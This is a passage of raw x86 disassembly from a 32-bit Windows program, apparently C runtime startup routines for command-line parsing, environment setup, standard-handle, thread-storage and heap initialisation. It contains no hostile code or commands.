  424b34:	jne    0x424b1c
  424b36:	cmp    BYTE PTR [esi],0x22
  424b39:	jne    0x424b4e
  424b3b:	jmp    0x424b4d
  424b3d:	cmp    al,0x20
  424b3f:	jbe    0x424b4e
  424b41:	inc    esi
  424b42:	cmp    BYTE PTR [esi],0x20
  424b45:	ja     0x424b41
  424b47:	jmp    0x424b4e
  424b49:	cmp    al,0x20
  424b4b:	ja     0x424b54
  424b4d:	inc    esi
  424b4e:	mov    al,BYTE PTR [esi]
  424b50:	test   al,al
  424b52:	jne    0x424b49
  424b54:	mov    eax,esi
  424b56:	pop    esi
  424b57:	ret    
  424b58:	push   ebx
  424b59:	xor    ebx,ebx
  424b5b:	cmp    DWORD PTR ds:0x45e26c,ebx
  424b61:	push   esi
  424b62:	push   edi
  424b63:	jne    0x424b6a
  424b65:	call   0x425f2c
  424b6a:	mov    esi,DWORD PTR ds:0x45dab4
  424b70:	xor    edi,edi
  424b72:	cmp    esi,ebx
  424b74:	jne    0x424b88
  424b76:	jmp    0x424ba8
  424b78:	cmp    al,0x3d
  424b7a:	je     0x424b7d
  424b7c:	inc    edi
  424b7d:	push   esi
  424b7e:	call   0x425950
  424b83:	pop    ecx
  424b84:	lea    esi,[esi+eax*1+0x1]
  424b88:	mov    al,BYTE PTR [esi]
  424b8a:	cmp    al,bl
  424b8c:	jne    0x424b78
  424b8e:	lea    eax,[edi*4+0x4]
  424b95:	push   eax
  424b96:	call   0x426062
  424b9b:	mov    edi,eax
  424b9d:	cmp    edi,ebx
  424b9f:	pop    ecx
  424ba0:	mov    DWORD PTR ds:0x45dae4,edi
  424ba6:	jne    0x424bad
  424ba8:	or     eax,0xffffffff
  424bab:	jmp    0x424c05
  424bad:	mov    esi,DWORD PTR ds:0x45dab4
  424bb3:	push   ebp
  424bb4:	jmp    0x424be0
  424bb6:	push   esi
  424bb7:	call   0x425950
  424bbc:	mov    ebp,eax
  424bbe:	inc    ebp
  424bbf:	cmp    BYTE PTR [esi],0x3d
  424bc2:	pop    ecx
  424bc3:	je     0x424bde
  424bc5:	push   ebp
  424bc6:	call   0x426062
  424bcb:	cmp    eax,ebx
  424bcd:	pop    ecx
  424bce:	mov    DWORD PTR [edi],eax
  424bd0:	je     0x424c09
  424bd2:	push   esi
  424bd3:	push   eax
  424bd4:	call   0x425720
  424bd9:	pop    ecx
  424bda:	pop    ecx
  424bdb:	add    edi,0x4
  424bde:	add    esi,ebp
  424be0:	cmp    BYTE PTR [esi],bl
  424be2:	jne    0x424bb6
  424be4:	push   DWORD PTR ds:0x45dab4
  424bea:	call   0x425f4a
  424bef:	mov    DWORD PTR ds:0x45dab4,ebx
  424bf5:	mov    DWORD PTR [edi],ebx
  424bf7:	mov    DWORD PTR ds:0x45e260,0x1
  424c01:	xor    eax,eax
  424c03:	pop    ecx
  424c04:	pop    ebp
  424c05:	pop    edi
  424c06:	pop    esi
  424c07:	pop    ebx
  424c08:	ret    
  424c09:	push   DWORD PTR ds:0x45dae4
  424c0f:	call   0x425f4a
  424c14:	mov    DWORD PTR ds:0x45dae4,ebx
  424c1a:	or     eax,0xffffffff
  424c1d:	jmp    0x424c03
  424c1f:	push   ebp
  424c20:	mov    ebp,esp
  424c22:	push   ecx
  424c23:	push   ebx
  424c24:	mov    ebx,DWORD PTR [ebp+0xc]
  424c27:	xor    edx,edx
  424c29:	cmp    DWORD PTR [ebp+0x8],edx
  424c2c:	push   edi
  424c2d:	mov    DWORD PTR [esi],edx
  424c2f:	mov    edi,ecx
  424c31:	mov    DWORD PTR [ebx],0x1
  424c37:	je     0x424c42
  424c39:	mov    ecx,DWORD PTR [ebp+0x8]
  424c3c:	add    DWORD PTR [ebp+0x8],0x4
  424c40:	mov    DWORD PTR [ecx],edi
  424c42:	cmp    BYTE PTR [eax],0x22
  424c45:	jne    0x424c55
  424c47:	xor    ecx,ecx
  424c49:	test   edx,edx
  424c4b:	sete   cl
  424c4e:	inc    eax
  424c4f:	mov    edx,ecx
  424c51:	mov    cl,0x22
  424c53:	jmp    0x424c82
  424c55:	inc    DWORD PTR [esi]
  424c57:	test   edi,edi
  424c59:	je     0x424c60
  424c5b:	mov    cl,BYTE PTR [eax]
  424c5d:	mov    BYTE PTR [edi],cl
  424c5f:	inc    edi
  424c60:	mov    cl,BYTE PTR [eax]
  424c62:	movzx  ebx,cl
  424c65:	inc    eax
  424c66:	test   BYTE PTR [ebx+0x45df21],0x4
  424c6d:	je     0x424c7b
  424c6f:	inc    DWORD PTR [esi]
  424c71:	test   edi,edi
  424c73:	je     0x424c7a
  424c75:	mov    bl,BYTE PTR [eax]
  424c77:	mov    BYTE PTR [edi],bl
  424c79:	inc    edi
  424c7a:	inc    eax
  424c7b:	test   cl,cl
  424c7d:	mov    ebx,DWORD PTR [ebp+0xc]
  424c80:	je     0x424cb4
  424c82:	test   edx,edx
  424c84:	jne    0x424c42
  424c86:	cmp    cl,0x20
  424c89:	je     0x424c90
  424c8b:	cmp    cl,0x9
  424c8e:	jne    0x424c42
  424c90:	test   edi,edi
  424c92:	je     0x424c98
  424c94:	and    BYTE PTR [edi-0x1],0x0
  424c98:	and    DWORD PTR [ebp-0x4],0x0
  424c9c:	cmp    BYTE PTR [eax],0x0
  424c9f:	je     0x424d7b
  424ca5:	mov    cl,BYTE PTR [eax]
  424ca7:	cmp    cl,0x20
  424caa:	je     0x424cb1
  424cac:	cmp    cl,0x9
  424caf:	jne    0x424cb7
  424cb1:	inc    eax
  424cb2:	jmp    0x424ca5
  424cb4:	dec    eax
  424cb5:	jmp    0x424c98
  424cb7:	cmp    BYTE PTR [eax],0x0
  424cba:	je     0x424d7b
  424cc0:	cmp    DWORD PTR [ebp+0x8],0x0
  424cc4:	je     0x424ccf
  424cc6:	mov    ecx,DWORD PTR [ebp+0x8]
  424cc9:	add    DWORD PTR [ebp+0x8],0x4
  424ccd:	mov    DWORD PTR [ecx],edi
  424ccf:	inc    DWORD PTR [ebx]
  424cd1:	xor    ebx,ebx
  424cd3:	inc    ebx
  424cd4:	xor    edx,edx
  424cd6:	jmp    0x424cda
  424cd8:	inc    eax
  424cd9:	inc    edx
  424cda:	cmp    BYTE PTR [eax],0x5c
  424cdd:	je     0x424cd8
  424cdf:	cmp    BYTE PTR [eax],0x22
  424ce2:	jne    0x424d0a
  424ce4:	test   dl,0x1
  424ce7:	jne    0x424d08
  424ce9:	cmp    DWORD PTR [ebp-0x4],0x0
  424ced:	je     0x424cfb
  424cef:	lea    ecx,[eax+0x1]
  424cf2:	cmp    BYTE PTR [ecx],0x22
  424cf5:	jne    0x424cfb
  424cf7:	mov    eax,ecx
  424cf9:	jmp    0x424cfd
  424cfb:	xor    ebx,ebx
  424cfd:	xor    ecx,ecx
  424cff:	cmp    DWORD PTR [ebp-0x4],ecx
  424d02:	sete   cl
  424d05:	mov    DWORD PTR [ebp-0x4],ecx
  424d08:	shr    edx,1
  424d0a:	test   edx,edx
  424d0c:	je     0x424d1b
  424d0e:	test   edi,edi
  424d10:	je     0x424d16
  424d12:	mov    BYTE PTR [edi],0x5c
  424d15:	inc    edi
  424d16:	inc    DWORD PTR [esi]
  424d18:	dec    edx
  424d19:	jne    0x424d0e
  424d1b:	mov    cl,BYTE PTR [eax]
  424d1d:	test   cl,cl
  424d1f:	je     0x424d69
  424d21:	cmp    DWORD PTR [ebp-0x4],0x0
  424d25:	jne    0x424d31
  424d27:	cmp    cl,0x20
  424d2a:	je     0x424d69
  424d2c:	cmp    cl,0x9
  424d2f:	je     0x424d69
  424d31:	test   ebx,ebx
  424d33:	je     0x424d63
  424d35:	test   edi,edi
  424d37:	je     0x424d52
  424d39:	movzx  edx,cl
  424d3c:	test   BYTE PTR [edx+0x45df21],0x4
  424d43:	je     0x424d4b
  424d45:	mov    BYTE PTR [edi],cl
  424d47:	inc    edi
  424d48:	inc    eax
  424d49:	inc    DWORD PTR [esi]
  424d4b:	mov    cl,BYTE PTR [eax]
  424d4d:	mov    BYTE PTR [edi],cl
  424d4f:	inc    edi
  424d50:	jmp    0x424d61
  424d52:	movzx  ecx,cl
  424d55:	test   BYTE PTR [ecx+0x45df21],0x4
  424d5c:	je     0x424d61
  424d5e:	inc    eax
  424d5f:	inc    DWORD PTR [esi]
  424d61:	inc    DWORD PTR [esi]
  424d63:	inc    eax
  424d64:	jmp    0x424cd1
  424d69:	test   edi,edi
  424d6b:	je     0x424d71
  424d6d:	and    BYTE PTR [edi],0x0
  424d70:	inc    edi
  424d71:	inc    DWORD PTR [esi]
  424d73:	mov    ebx,DWORD PTR [ebp+0xc]
  424d76:	jmp    0x424c9c
  424d7b:	mov    eax,DWORD PTR [ebp+0x8]
  424d7e:	test   eax,eax
  424d80:	je     0x424d85
  424d82:	and    DWORD PTR [eax],0x0
  424d85:	inc    DWORD PTR [ebx]
  424d87:	pop    edi
  424d88:	pop    ebx
  424d89:	leave  
  424d8a:	ret    
  424d8b:	push   ebp
  424d8c:	mov    ebp,esp
  424d8e:	push   ecx
  424d8f:	push   ecx
  424d90:	push   ebx
  424d91:	push   esi
  424d92:	push   edi
  424d93:	xor    edi,edi
  424d95:	cmp    DWORD PTR ds:0x45e26c,edi
  424d9b:	jne    0x424da2
  424d9d:	call   0x425f2c
  424da2:	and    BYTE PTR ds:0x45dc14,0x0
  424da9:	push   0x104
  424dae:	mov    esi,0x45db10
  424db3:	push   esi
  424db4:	push   edi
  424db5:	call   DWORD PTR ds:0x429068
  424dbb:	mov    eax,ds:0x45e274
  424dc0:	cmp    eax,edi
  424dc2:	mov    DWORD PTR ds:0x45daf4,esi
  424dc8:	je     0x424dd1
  424dca:	cmp    BYTE PTR [eax],0x0
  424dcd:	mov    ebx,eax
  424dcf:	jne    0x424dd3
  424dd1:	mov    ebx,esi
  424dd3:	lea    eax,[ebp-0x4]
  424dd6:	push   eax
  424dd7:	push   edi
  424dd8:	lea    esi,[ebp-0x8]
  424ddb:	xor    ecx,ecx
  424ddd:	mov    eax,ebx
  424ddf:	call   0x424c1f
  424de4:	mov    esi,DWORD PTR [ebp-0x4]
  424de7:	mov    eax,DWORD PTR [ebp-0x8]
  424dea:	shl    esi,0x2
  424ded:	add    eax,esi
  424def:	push   eax
  424df0:	call   0x426062
  424df5:	mov    edi,eax
  424df7:	add    esp,0xc
  424dfa:	test   edi,edi
  424dfc:	jne    0x424e03
  424dfe:	or     eax,0xffffffff
  424e01:	jmp    0x424e28
  424e03:	lea    eax,[ebp-0x4]
  424e06:	push   eax
  424e07:	lea    ecx,[esi+edi*1]
  424e0a:	push   edi
  424e0b:	lea    esi,[ebp-0x8]
  424e0e:	mov    eax,ebx
  424e10:	call   0x424c1f
  424e15:	mov    eax,DWORD PTR [ebp-0x4]
  424e18:	dec    eax
  424e19:	pop    ecx
  424e1a:	mov    ds:0x45dad8,eax
  424e1f:	pop    ecx
  424e20:	mov    DWORD PTR ds:0x45dadc,edi
  424e26:	xor    eax,eax
  424e28:	pop    edi
  424e29:	pop    esi
  424e2a:	pop    ebx
  424e2b:	leave  
  424e2c:	ret    
  424e2d:	push   ecx
  424e2e:	push   ecx
  424e2f:	mov    eax,ds:0x45dc18
  424e34:	push   ebx
  424e35:	push   ebp
  424e36:	push   esi
  424e37:	push   edi
  424e38:	mov    edi,DWORD PTR ds:0x429080
  424e3e:	xor    ebx,ebx
  424e40:	xor    esi,esi
  424e42:	cmp    eax,ebx
  424e44:	push   0x2
  424e46:	pop    ebp
  424e47:	jne    0x424e76
  424e49:	call   edi
  424e4b:	mov    esi,eax
  424e4d:	cmp    esi,ebx
  424e4f:	je     0x424e5d
  424e51:	mov    DWORD PTR ds:0x45dc18,0x1
  424e5b:	jmp    0x424e7b
  424e5d:	call   DWORD PTR ds:0x429044
  424e63:	cmp    eax,0x78
  424e66:	jne    0x424e71
  424e68:	mov    eax,ebp
  424e6a:	mov    ds:0x45dc18,eax
  424e6f:	jmp    0x424e76
  424e71:	mov    eax,ds:0x45dc18
  424e76:	cmp    eax,0x1
  424e79:	jne    0x424ef8
  424e7b:	cmp    esi,ebx
  424e7d:	jne    0x424e87
  424e7f:	call   edi
  424e81:	mov    esi,eax
  424e83:	cmp    esi,ebx
  424e85:	je     0x424f00
  424e87:	cmp    WORD PTR [esi],bx
  424e8a:	mov    eax,esi
  424e8c:	je     0x424e9c
  424e8e:	add    eax,ebp
  424e90:	cmp    WORD PTR [eax],bx
  424e93:	jne    0x424e8e
  424e95:	add    eax,ebp
  424e97:	cmp    WORD PTR [eax],bx
  424e9a:	jne    0x424e8e
  424e9c:	mov    edi,DWORD PTR ds:0x42907c
  424ea2:	push   ebx
  424ea3:	push   ebx
  424ea4:	push   ebx
  424ea5:	sub    eax,esi
  424ea7:	push   ebx
  424ea8:	sar    eax,1
  424eaa:	inc    eax
  424eab:	push   eax
  424eac:	push   esi
  424ead:	push   ebx
  424eae:	push   ebx
  424eaf:	mov    DWORD PTR [esp+0x34],eax
  424eb3:	call   edi
  424eb5:	mov    ebp,eax
  424eb7:	cmp    ebp,ebx
  424eb9:	je     0x424eed
  424ebb:	push   ebp
  424ebc:	call   0x426062
  424ec1:	cmp    eax,ebx
  424ec3:	pop    ecx
  424ec4:	mov    DWORD PTR [esp+0x10],eax
  424ec8:	je     0x424eed
  424eca:	push   ebx
  424ecb:	push   ebx
  424ecc:	push   ebp
  424ecd:	push   eax
  424ece:	push   DWORD PTR [esp+0x24]
  424ed2:	push   esi
  424ed3:	push   ebx
  424ed4:	push   ebx
  424ed5:	call   edi
  424ed7:	test   eax,eax
  424ed9:	jne    0x424ee9
  424edb:	push   DWORD PTR [esp+0x10]
  424edf:	call   0x425f4a
  424ee4:	pop    ecx
  424ee5:	mov    DWORD PTR [esp+0x10],ebx
  424ee9:	mov    ebx,DWORD PTR [esp+0x10]
  424eed:	push   esi
  424eee:	call   DWORD PTR ds:0x429078
  424ef4:	mov    eax,ebx
  424ef6:	jmp    0x424f48
  424ef8:	cmp    eax,ebp
  424efa:	je     0x424f04
  424efc:	cmp    eax,ebx
  424efe:	je     0x424f04
  424f00:	xor    eax,eax
  424f02:	jmp    0x424f48
  424f04:	call   DWORD PTR ds:0x429074
  424f0a:	mov    esi,eax
  424f0c:	cmp    esi,ebx
  424f0e:	je     0x424f00
  424f10:	cmp    BYTE PTR [esi],bl
  424f12:	je     0x424f1e
  424f14:	inc    eax
  424f15:	cmp    BYTE PTR [eax],bl
  424f17:	jne    0x424f14
  424f19:	inc    eax
  424f1a:	cmp    BYTE PTR [eax],bl
  424f1c:	jne    0x424f14
  424f1e:	sub    eax,esi
  424f20:	inc    eax
  424f21:	mov    ebp,eax
  424f23:	push   ebp
  424f24:	call   0x426062
  424f29:	mov    edi,eax
  424f2b:	cmp    edi,ebx
  424f2d:	pop    ecx
  424f2e:	jne    0x424f34
  424f30:	xor    edi,edi
  424f32:	jmp    0x424f3f
  424f34:	push   ebp
  424f35:	push   esi
  424f36:	push   edi
  424f37:	call   0x426080
  424f3c:	add    esp,0xc
  424f3f:	push   esi
  424f40:	call   DWORD PTR ds:0x429070
  424f46:	mov    eax,edi
  424f48:	pop    edi
  424f49:	pop    esi
  424f4a:	pop    ebp
  424f4b:	pop    ebx
  424f4c:	pop    ecx
  424f4d:	pop    ecx
  424f4e:	ret    
  424f4f:	sub    esp,0x48
  424f52:	push   ebx
  424f53:	mov    ebx,0x480
  424f58:	push   ebx
  424f59:	call   0x426062
  424f5e:	test   eax,eax
  424f60:	pop    ecx
  424f61:	jne    0x424f6b
  424f63:	or     eax,0xffffffff
  424f66:	jmp    0x425148
  424f6b:	mov    ds:0x45e160,eax
  424f70:	mov    DWORD PTR ds:0x45e148,0x20
  424f7a:	lea    ecx,[eax+0x480]
  424f80:	jmp    0x424fa0
  424f82:	and    BYTE PTR [eax+0x4],0x0
  424f86:	or     DWORD PTR [eax],0xffffffff
  424f89:	and    DWORD PTR [eax+0x8],0x0
  424f8d:	mov    BYTE PTR [eax+0x5],0xa
  424f91:	mov    ecx,DWORD PTR ds:0x45e160
  424f97:	add    eax,0x24
  424f9a:	add    ecx,0x480
  424fa0:	cmp    eax,ecx
  424fa2:	jb     0x424f82
  424fa4:	push   ebp
  424fa5:	push   esi
  424fa6:	push   edi
  424fa7:	lea    eax,[esp+0x14]
  424fab:	push   eax
  424fac:	call   DWORD PTR ds:0x42904c
  424fb2:	cmp    WORD PTR [esp+0x46],0x0
  424fb8:	je     0x4250a7
  424fbe:	mov    eax,DWORD PTR [esp+0x48]
  424fc2:	test   eax,eax
  424fc4:	je     0x4250a7
  424fca:	mov    edi,DWORD PTR [eax]
  424fcc:	lea    ebp,[eax+0x4]
  424fcf:	lea    eax,[edi+ebp*1]
  424fd2:	mov    DWORD PTR [esp+0x10],eax
  424fd6:	mov    eax,0x800
  424fdb:	cmp    edi,eax
  424fdd:	jl     0x424fe1
  424fdf:	mov    edi,eax
  424fe1:	cmp    DWORD PTR ds:0x45e148,edi
  424fe7:	jge    0x425037
  424fe9:	mov    esi,0x45e164
  424fee:	push   ebx
  424fef:	call   0x426062
  424ff4:	test   eax,eax
  424ff6:	pop    ecx
  424ff7:	je     0x425031
  424ff9:	add    DWORD PTR ds:0x45e148,0x20
  425000:	mov    DWORD PTR [esi],eax
  425002:	lea    ecx,[eax+0x480]
  425008:	jmp    0x425020
  42500a:	and    BYTE PTR [eax+0x4],0x0
  42500e:	or     DWORD PTR [eax],0xffffffff
  425011:	and    DWORD PTR [eax+0x8],0x0
  425015:	mov    BYTE PTR [eax+0x5],0xa
  425019:	mov    ecx,DWORD PTR [esi]
  42501b:	add    eax,0x24
  42501e:	add    ecx,ebx
  425020:	cmp    eax,ecx
  425022:	jb     0x42500a
  425024:	add    esi,0x4
  425027:	cmp    DWORD PTR ds:0x45e148,edi
  42502d:	jl     0x424fee
  42502f:	jmp    0x425037
  425031:	mov    edi,DWORD PTR ds:0x45e148
  425037:	xor    ebx,ebx
  425039:	test   edi,edi
  42503b:	jle    0x4250a7
  42503d:	mov    eax,DWORD PTR [esp+0x10]
  425041:	mov    eax,DWORD PTR [eax]
  425043:	cmp    eax,0xffffffff
  425046:	je     0x42509c
  425048:	mov    cl,BYTE PTR [ebp+0x0]
  42504b:	test   cl,0x1
  42504e:	je     0x42509c
  425050:	test   cl,0x8
  425053:	jne    0x425060
  425055:	push   eax
  425056:	call   DWORD PTR ds:0x429088
  42505c:	test   eax,eax
  42505e:	je     0x42509c
  425060:	mov    ecx,ebx
  425062:	mov    eax,ebx
  425064:	and    eax,0x1f
  425067:	lea    eax,[eax+eax*8]
  42506a:	sar    ecx,0x5
  42506d:	mov    ecx,DWORD PTR [ecx*4+0x45e160]
  425074:	lea    esi,[ecx+eax*4]
  425077:	mov    eax,DWORD PTR [esp+0x10]
  42507b:	mov    eax,DWORD PTR [eax]
  42507d:	mov    DWORD PTR [esi],eax
  42507f:	mov    al,BYTE PTR [ebp+0x0]
  425082:	mov    BYTE PTR [esi+0x4],al
  425085:	lea    eax,[esi+0xc]
  425088:	push   0xfa0
  42508d:	push   eax
  42508e:	call   0x4263cd
  425093:	test   eax,eax
  425095:	pop    ecx
  425096:	pop    ecx
  425097:	je     0x4250c7
  425099:	inc    DWORD PTR [esi+0x8]
  42509c:	add    DWORD PTR [esp+0x10],0x4
  4250a1:	inc    ebx
  4250a2:	inc    ebp
  4250a3:	cmp    ebx,edi
  4250a5:	jl     0x42503d
  4250a7:	xor    ebx,ebx
  4250a9:	mov    ecx,DWORD PTR ds:0x45e160
  4250af:	lea    eax,[ebx+ebx*8]
  4250b2:	lea    esi,[ecx+eax*4]
  4250b5:	cmp    DWORD PTR [esi],0xffffffff
  4250b8:	jne    0x425129
  4250ba:	test   ebx,ebx
  4250bc:	mov    BYTE PTR [esi+0x4],0x81
  4250c0:	jne    0x4250cc
  4250c2:	push   0xfffffff6
  4250c4:	pop    eax
  4250c5:	jmp    0x4250d6
  4250c7:	or     eax,0xffffffff
  4250ca:	jmp    0x425145
  4250cc:	mov    eax,ebx
  4250ce:	dec    eax
  4250cf:	neg    eax
  4250d1:	sbb    eax,eax
  4250d3:	add    eax,0xfffffff5
  4250d6:	push   eax
  4250d7:	call   DWORD PTR ds:0x429064
  4250dd:	mov    edi,eax
  4250df:	cmp    edi,0xffffffff
  4250e2:	je     0x425123
  4250e4:	push   edi
  4250e5:	call   DWORD PTR ds:0x429088
  4250eb:	test   eax,eax
  4250ed:	je     0x425123
  4250ef:	and    eax,0xff
  4250f4:	cmp    eax,0x2
  4250f7:	mov    DWORD PTR [esi],edi
  4250f9:	jne    0x425101
  4250fb:	or     BYTE PTR [esi+0x4],0x40
  4250ff:	jmp    0x42510a
  425101:	cmp    eax,0x3
  425104:	jne    0x42510a
  425106:	or     BYTE PTR [esi+0x4],0x8
  42510a:	lea    eax,[esi+0xc]
  42510d:	push   0xfa0
  425112:	push   eax
  425113:	call   0x4263cd
  425118:	test   eax,eax
  42511a:	pop    ecx
  42511b:	pop    ecx
  42511c:	je     0x4250c7
  42511e:	inc    DWORD PTR [esi+0x8]
  425121:	jmp    0x42512d
  425123:	or     BYTE PTR [esi+0x4],0x40
  425127:	jmp    0x42512d
  425129:	or     BYTE PTR [esi+0x4],0x80
  42512d:	inc    ebx
  42512e:	cmp    ebx,0x3
  425131:	jl     0x4250a9
  425137:	push   DWORD PTR ds:0x45e148
  42513d:	call   DWORD PTR ds:0x429084
  425143:	xor    eax,eax
  425145:	pop    edi
  425146:	pop    esi
  425147:	pop    ebp
  425148:	pop    ebx
  425149:	add    esp,0x48
  42514c:	ret    
  42514d:	push   0xc
  42514f:	push   0x4295b0
  425154:	call   0x425340
  425159:	mov    DWORD PTR [ebp-0x1c],0x42a008
  425160:	cmp    DWORD PTR [ebp-0x1c],0x42a008
  425167:	jae    0x42518b
  425169:	and    DWORD PTR [ebp-0x4],0x0
  42516d:	mov    eax,DWORD PTR [ebp-0x1c]
  425170:	mov    eax,DWORD PTR [eax]
  425172:	test   eax,eax
  425174:	je     0x425181
  425176:	call   eax
  425178:	jmp    0x425181
  42517a:	xor    eax,eax
  42517c:	inc    eax
  42517d:	ret    
  42517e:	mov    esp,DWORD PTR [ebp-0x18]
  425181:	or     DWORD PTR [ebp-0x4],0xffffffff
  425185:	add    DWORD PTR [ebp-0x1c],0x4
  425189:	jmp    0x425160
  42518b:	call   0x42537b
  425190:	ret    
  425191:	push   0xc
  425193:	push   0x4295c0
  425198:	call   0x425340
  42519d:	mov    DWORD PTR [ebp-0x1c],0x42a010
  4251a4:	cmp    DWORD PTR [ebp-0x1c],0x42a010
  4251ab:	jae    0x4251cf
  4251ad:	and    DWORD PTR [ebp-0x4],0x0
  4251b1:	mov    eax,DWORD PTR [ebp-0x1c]
  4251b4:	mov    eax,DWORD PTR [eax]
  4251b6:	test   eax,eax
  4251b8:	je     0x4251c5
  4251ba:	call   eax
  4251bc:	jmp    0x4251c5
  4251be:	xor    eax,eax
  4251c0:	inc    eax
  4251c1:	ret    
  4251c2:	mov    esp,DWORD PTR [ebp-0x18]
  4251c5:	or     DWORD PTR [ebp-0x4],0xffffffff
  4251c9:	add    DWORD PTR [ebp-0x1c],0x4
  4251cd:	jmp    0x4251a4
  4251cf:	call   0x42537b
  4251d4:	ret    
  4251d5:	call   0x425416
  4251da:	mov    eax,ds:0x45d304
  4251df:	cmp    eax,0xffffffff
  4251e2:	je     0x4251f2
  4251e4:	push   eax
  4251e5:	call   DWORD PTR ds:0x429090
  4251eb:	or     DWORD PTR ds:0x45d304,0xffffffff
  4251f2:	ret    
  4251f3:	push   ebx
  4251f4:	push   esi
  4251f5:	call   DWORD PTR ds:0x429044
  4251fb:	push   DWORD PTR ds:0x45d304
  425201:	mov    ebx,eax
  425203:	call   DWORD PTR ds:0x4290a0
  425209:	mov    esi,eax
  42520b:	test   esi,esi
  42520d:	jne    0x425258
  42520f:	push   0x88
  425214:	push   0x1
  425216:	call   0x426458
  42521b:	mov    esi,eax
  42521d:	test   esi,esi
  42521f:	pop    ecx
  425220:	pop    ecx
  425221:	je     0x425250
  425223:	push   esi
  425224:	push   DWORD PTR ds:0x45d304
  42522a:	call   DWORD PTR ds:0x42909c
  425230:	test   eax,eax
  425232:	je     0x425250
  425234:	mov    DWORD PTR [esi+0x54],0x45d258
  42523b:	mov    DWORD PTR [esi+0x14],0x1
  425242:	call   DWORD PTR ds:0x429098
  425248:	or     DWORD PTR [esi+0x4],0xffffffff
  42524c:	mov    DWORD PTR [esi],eax
  42524e:	jmp    0x425258
  425250:	push   0x10
  425252:	call   0x424406
  425257:	pop    ecx
  425258:	push   ebx
  425259:	call   DWORD PTR ds:0x429094
  42525f:	mov    eax,esi
  425261:	pop    esi
  425262:	pop    ebx
  425263:	ret    
  425264:	call   0x4253cd
  425269:	test   eax,eax
  42526b:	je     0x42527d
  42526d:	call   DWORD PTR ds:0x4290a4
  425273:	cmp    eax,0xffffffff
  425276:	mov    ds:0x45d304,eax
  42527b:	jne    0x425285
  42527d:	call   0x4251d5
  425282:	xor    eax,eax
  425284:	ret    
  425285:	push   esi
  425286:	push   0x88
  42528b:	push   0x1
  42528d:	call   0x426458
  425292:	mov    esi,eax
  425294:	test   esi,esi
  425296:	pop    ecx
  425297:	pop    ecx
  425298:	je     0x4252ca
  42529a:	push   esi
  42529b:	push   DWORD PTR ds:0x45d304
  4252a1:	call   DWORD PTR ds:0x42909c
  4252a7:	test   eax,eax
  4252a9:	je     0x4252ca
  4252ab:	mov    DWORD PTR [esi+0x54],0x45d258
  4252b2:	mov    DWORD PTR [esi+0x14],0x1
  4252b9:	call   DWORD PTR ds:0x429098
  4252bf:	or     DWORD PTR [esi+0x4],0xffffffff
  4252c3:	mov    DWORD PTR [esi],eax
  4252c5:	xor    eax,eax
  4252c7:	inc    eax
  4252c8:	pop    esi
  4252c9:	ret    
  4252ca:	call   0x4251d5
  4252cf:	xor    eax,eax
  4252d1:	pop    esi
  4252d2:	ret    
  4252d3:	cmp    DWORD PTR ds:0x45dac4,0x2
  4252da:	jne    0x4252e9
  4252dc:	cmp    DWORD PTR ds:0x45dad0,0x5
  4252e3:	jb     0x4252e9
  4252e5:	xor    eax,eax
  4252e7:	inc    eax
  4252e8:	ret    
  4252e9:	push   0x3
  4252eb:	pop    eax
  4252ec:	ret    
  4252ed:	xor    eax,eax
  4252ef:	cmp    DWORD PTR [esp+0x4],eax
  4252f3:	push   0x0
  4252f5:	sete   al
  4252f8:	push   0x1000
  4252fd:	push   eax
  4252fe:	call   DWORD PTR ds:0x429034
  425304:	test   eax,eax
  425306:	mov    ds:0x45e140,eax
  42530b:	je     0x425337
  42530d:	call   0x4252d3
  425312:	cmp    eax,0x3
  425315:	mov    ds:0x45e144,eax
  42531a:	jne    0x42533a
  42531c:	push   0x3f8
  425321:	call   0x4266da
  425326:	test   eax,eax
  425328:	pop    ecx
  425329:	jne    0x42533a
  42532b:	push   DWORD PTR ds:0x45e140
  425331:	call   DWORD PTR ds:0x4290a8
  425337:	xor    eax,eax
  425339:	ret    
  42533a:	xor    eax,eax
  42533c:	inc    eax
  42533d:	ret    
  42533e:	int3   
  42533f:	int3   
  425340:	push   0x427208
  425345:	mov    eax,fs:0x0
  42534b:	push   eax
  42534c:	mov    eax,DWORD PTR [esp+0x10]
  425350:	mov    DWORD PTR [esp+0x10],ebp
  425354:	lea    ebp,[esp+0x10]
  425358:	sub    esp,eax
  42535a:	push   ebx
  42535b:	push   esi
  42535c:	push   edi
  42535d:	mov    eax,DWORD PTR [ebp-0x8]
  425360:	mov    DWORD PTR [ebp-0x18],esp
  425363:	push   eax
  425364:	mov    eax,DWORD PTR [ebp-0x4]
  425367:	mov    DWORD PTR [ebp-0x4],0xffffffff
  42536e:	mov    DWORD PTR [ebp-0x8],eax
  425371:	lea    eax,[ebp-0x10]
  425374:	mov    fs:0x0,eax
  42537a:	ret    
  42537b:	mov    ecx,DWORD PTR [ebp-0x10]
  42537e:	mov    DWORD PTR fs:0x0,ecx
  425385:	pop    ecx
  425386:	pop    edi
  425387:	pop    esi
  425388:	pop    ebx
  425389:	leave  
  42538a:	push   ecx
  42538b:	ret    
  42538c:	int3   
  42538d:	int3   
  42538e:	int3   
  42538f:	int3   
  425390:	cmp    eax,0x1000
  425395:	jae    0x4253a5
  425397:	neg    eax
  425399:	add    eax,esp
  42539b:	add    eax,0x4
  42539e:	test   DWORD PTR [eax],eax
  4253a0:	xchg   esp,eax
  4253a1:	mov    eax,DWORD PTR [eax]
  4253a3:	push   eax
  4253a4:	ret    
  4253a5:	push   ecx
  4253a6:	lea    ecx,[esp+0x8]
  4253aa:	sub    ecx,0x1000
  4253b0:	sub    eax,0x1000
  4253b5:	test   DWORD PTR [ecx],eax
  4253b7:	cmp    eax,0x1000
  4253bc:	jae    0x4253aa
  4253be:	sub    ecx,eax
  4253c0:	mov    eax,esp
  4253c2:	test   DWORD PTR [ecx],eax
  4253c4:	mov    esp,ecx
  4253c6:	mov    ecx,DWORD PTR [eax]
  4253c8:	mov    eax,DWORD PTR [eax+0x4]
  4253cb:	push   eax
  4253cc:	ret    
  4253cd:	push   esi
  4253ce:	push   edi
  4253cf:	xor    esi,esi
  4253d1:	mov    edi,0x45dc20
  4253d6:	cmp    DWORD PTR [esi*8+0x45d314],0x1
  4253de:	jne    0x4253fe
  4253e0:	lea    eax,[esi*8+0x45d310]
  4253e7:	mov    DWORD PTR [eax],edi
  4253e9:	push   0xfa0
  4253ee:	push   DWORD PTR [eax]
  4253f0:	add    edi,0x18
  4253f3:	call   0x4263cd
  4253f8:	test   eax,eax
  4253fa:	pop    ecx
  4253fb:	pop    ecx
  4253fc:	je     0x42540a
  4253fe:	inc    esi
  4253ff:	cmp    esi,0x24
  425402:	jl     0x4253d6
  425404:	xor    eax,eax
  425406:	inc    eax
  425407:	pop    edi
